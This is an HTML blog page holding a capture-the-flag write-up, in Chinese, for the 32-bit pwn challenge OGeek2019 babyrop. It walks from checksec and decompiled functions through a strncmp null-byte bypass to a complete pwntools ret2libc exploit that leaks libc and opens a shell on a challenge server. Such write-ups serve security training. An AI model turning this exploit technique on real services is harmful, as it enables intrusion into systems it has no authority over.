@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mykonos">
+
+
+
+
+
+<title>OGeek2019 babyrop | Silence to hear.</title>
+
+
+
+    <link rel="icon" href="/ico.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mykonos-x&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mykonos-x&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">OGeek2019 babyrop</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mykonos</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 4, 2022&nbsp;&nbsp;17:34:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>checksec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf); </span><br><span class="line">  sub_80487D0(v2); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x2F;dev&#x2F;urandom : Unix系统中的特殊设备文件,可用作<code>随机数发生器</code>或者<code>伪随机数发生器</code></li>
+</ul>
+<h3 id="sub-804871F"><a href="#sub-804871F" class="headerlink" title="sub_804871F"></a>sub_804871F</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804871F</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);          <span class="comment">// a1是/dev/urandom生成的随机数,将其写入s</span></span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )      <span class="comment">//比较s和用户输入的buf值,如果为1(buf&gt;s)则退出,否则输出Correct</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>]; <span class="comment">//带进sub_80487D0()的参数为用户输入的第8个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>sprintf() : 发送格式化输出到str所指向的字符串</li>
+</ul>
+<p>这里利用strncmp()函数遇到<code>&#39;\x00&#39;</code>截断的性质,让buf小于这个随机数s,返回0,输出Correct后进入sub_80487D0()函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">b&quot;\x00&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sub-80487D0"><a href="#sub-80487D0" class="headerlink" title="sub_80487D0"></a>sub_80487D0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">sub_80487D0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果a1 &#x3D;&#x3D; 127,则读取<code>0xC8</code>大小,否则读取a1大小</p>
+<p>我们可以看到buf大小为<code>231</code> , 即<code>0xE7</code>,而<code>0xC8</code>(200)长度是不够的,于是我们需要a1尽可能的大,payload可以这样构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_1 += <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<p>第一阶段的完成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<p>接着我们就可以打一段ROP了,先构造一条ropchain,通过<code>write</code>leak其<code>libc基址</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload_2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span> , <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;write_addr -&gt; %s&quot;</span> % <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>接着拿到<code>system</code>和<code>/bin/sh</code>然后getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload_3 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">0x4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Arch:     i386-32-little</span></span><br><span class="line"><span class="string">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="string">    Stack:    No canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x8048000)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span> , arch = <span class="string">&#x27;i386&#x27;</span> , log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">25769</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop[OGeek2019]&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop[OGeek2019]&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host , port)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x08048825</span></span><br><span class="line">payload_1 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload_1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload_2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload_2)</span><br><span class="line"><span class="comment"># write_addr = u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4 , b&#x27;\x00&#x27;))</span></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span> , <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;write_addr -&gt; %s&quot;</span> % <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;write&quot; , write_addr)</span></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/libc/libc-2.23_.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment"># success(&quot;libc_base -&gt; %s&quot; % hex(libc_base))</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload_3 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">0x4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload_1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">io.sendline(payload_3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Mykonos</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://mykonos-x.github.io/2022/06/04/OGeek2019-babyrop/">http://mykonos-x.github.io/2022/06/04/OGeek2019-babyrop/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span><strong>You can go further</strong>.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/write-up/"># write-up</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/06/22/For-Final-Exam-JavaScript%EF%BC%9Aweb%E5%89%8D%E7%AB%AF%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">(For Final Exam)JavaScript：web前端部分知识总结</a>
+            
+            
+            <a class="next" rel="next" href="/2022/05/30/BJDCTF2020-Cookie-is-so-subtle/">BJDCTF2020 Cookie is so subtle</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mykonos | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
